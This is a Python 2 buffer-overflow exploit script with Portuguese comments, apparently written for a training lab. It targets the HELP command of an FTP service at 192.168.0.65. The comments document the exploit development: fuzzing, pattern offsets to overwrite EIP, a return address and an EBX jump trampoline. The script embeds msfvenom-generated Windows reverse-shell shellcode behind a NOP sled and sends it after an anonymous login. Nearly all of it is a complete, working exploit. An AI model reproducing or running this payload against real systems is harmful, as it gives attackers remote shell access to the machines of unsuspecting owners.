#!/usr/bin/python

import socket,time

#Devido a essa aplicacao apresentar uma caracteristica diferente foi necessario usar um time para conseguir exibir todas informacoes do banner
#Alem de interagir com a aplicacao da forma correta

#Cria o buffer para validar se a aplicacao tem crash com a quantidade de buffers descobertos no fuzzing
#buffer = 'A' * 1300

#descoberto que a aplicacao tem crash com 1300 bytes vamos utilizar o pattern_create.rb para descobrir exatamente com quantos bytes chegamos no EIP
#buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B'

#uma vez enviando a string criada o registrador EIP ficou no seguinte endereco de memoria 356A4234 e ao jogar no pattern_offset.rb descobriu-se que para chegar em EIP precisa-se de 1064
#buffer = 'A' * 1064 + 'B' * 4

#Gerenciando EBX, onde sera enviado a quantidade de bytes para chegar em EIP e EIP ter o endereco de EBX
#buffer = 'A' * 1064 + '\xC8\x11\x9E\x7C'

#Cria as intrucoes para o programa ir para o espaco onde estara nosso exploit
#No caso o jmp tem as instrucoes 83eb32 que corresponde ha SUB EBX,32 que significa voltar 50 bytes e FFE3 que significa JMP EBX
jmp = '\x83\xEB\x32' * 8
jmp += '\xFF\xE3'

#Uma vez que para chegar em EIP precisa de 1064 bytes, sobram 40 bytes em EBX, esse espaco nao e suficiente para o payload
#sendo assim retiramos 40 bytes no envio de A deixando com 1024 e esses 40 bytes que sobram enviamos com B mais jmp
#ficando 14 B e 26 bytes de instrucoes assemble em jmp 
#buffer = 'A' * 1024 + 'B' * (40 - len(jmp)) + jmp + '\xC8\x11\x9E\x7C'

#Shell code (alterar para o gerado no seu laboratorio)
# comando usado para geral:
#msfvenom -p windows/shell_reverse_tcp LHOST='IP' LPORT='porta' -b '\x00\x0a\x0d\x20\x40' EXITFUNC=thread -f python
buf =  ""
buf += "\xb8\xe9\x9b\x0e\xf3\xdb\xd9\xd9\x74\x24\xf4\x5b\x2b"
buf += "\xc9\xb1\x52\x31\x43\x12\x83\xc3\x04\x03\xaa\x95\xec"
buf += "\x06\xd0\x42\x72\xe8\x28\x93\x13\x60\xcd\xa2\x13\x16"
buf += "\x86\x95\xa3\x5c\xca\x19\x4f\x30\xfe\xaa\x3d\x9d\xf1"
buf += "\x1b\x8b\xfb\x3c\x9b\xa0\x38\x5f\x1f\xbb\x6c\xbf\x1e"
buf += "\x74\x61\xbe\x67\x69\x88\x92\x30\xe5\x3f\x02\x34\xb3"
buf += "\x83\xa9\x06\x55\x84\x4e\xde\x54\xa5\xc1\x54\x0f\x65"
buf += "\xe0\xb9\x3b\x2c\xfa\xde\x06\xe6\x71\x14\xfc\xf9\x53"
buf += "\x64\xfd\x56\x9a\x48\x0c\xa6\xdb\x6f\xef\xdd\x15\x8c"
buf += "\x92\xe5\xe2\xee\x48\x63\xf0\x49\x1a\xd3\xdc\x68\xcf"
buf += "\x82\x97\x67\xa4\xc1\xff\x6b\x3b\x05\x74\x97\xb0\xa8"
buf += "\x5a\x11\x82\x8e\x7e\x79\x50\xae\x27\x27\x37\xcf\x37"
buf += "\x88\xe8\x75\x3c\x25\xfc\x07\x1f\x22\x31\x2a\x9f\xb2"
buf += "\x5d\x3d\xec\x80\xc2\x95\x7a\xa9\x8b\x33\x7d\xce\xa1"
buf += "\x84\x11\x31\x4a\xf5\x38\xf6\x1e\xa5\x52\xdf\x1e\x2e"
buf += "\xa2\xe0\xca\xe1\xf2\x4e\xa5\x41\xa2\x2e\x15\x2a\xa8"
buf += "\xa0\x4a\x4a\xd3\x6a\xe3\xe1\x2e\xfd\xcc\x5e\x30\xc0"
buf += "\xa4\x9c\x30\x3b\x8e\x28\xd6\x51\xe0\x7c\x41\xce\x99"
buf += "\x24\x19\x6f\x65\xf3\x64\xaf\xed\xf0\x99\x7e\x06\x7c"
buf += "\x89\x17\xe6\xcb\xf3\xbe\xf9\xe1\x9b\x5d\x6b\x6e\x5b"
buf += "\x2b\x90\x39\x0c\x7c\x66\x30\xd8\x90\xd1\xea\xfe\x68"
buf += "\x87\xd5\xba\xb6\x74\xdb\x43\x3a\xc0\xff\x53\x82\xc9"
buf += "\xbb\x07\x5a\x9c\x15\xf1\x1c\x76\xd4\xab\xf6\x25\xbe"
buf += "\x3b\x8e\x05\x01\x3d\x8f\x43\xf7\xa1\x3e\x3a\x4e\xde"
buf += "\x8f\xaa\x46\xa7\xed\x4a\xa8\x72\xb6\x6b\x4b\x56\xc3"
buf += "\x03\xd2\x33\x6e\x4e\xe5\xee\xad\x77\x66\x1a\x4e\x8c"
buf += "\x76\x6f\x4b\xc8\x30\x9c\x21\x41\xd5\xa2\x96\x62\xfc"

#Uma vez o fluxo do programa alterado da forma correta podemos enviar ao inves de As \x90 (NOPS) menos a quantidade do nosso shell code e o shell code sem badchars na variavel buf
buffer = '\x90' * (1024 - len(buf)) + buf + 'B' * (40 - len(jmp)) + jmp + '\xC8\x11\x9E\x7C'

#cria socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#conecta no socket na porta 21
s.connect(('192.168.0.65',21))

#pega a resposta
r = s.recv(4096)

print r

time.sleep(2)
#Envia um usuario de teste
s.send('USER anonymous\r\n')
r = s.recv(1024)
print r

time.sleep(2)
#Envia uma senha
s.send('PASS anonymous\r\n')
r = s.recv(4096)
print r

#Foi necessario ajustar o time out e diminuir para ajustar e o exploit dar certo
#No exemplo do longato ele coloca so um time out
#time.sleep(20)
time.sleep(5)
s.send('HELP'+buffer+'\r\n')
r = s.recv(8192)
print r

time.sleep(2)
#Fecha a conexao
s.close()
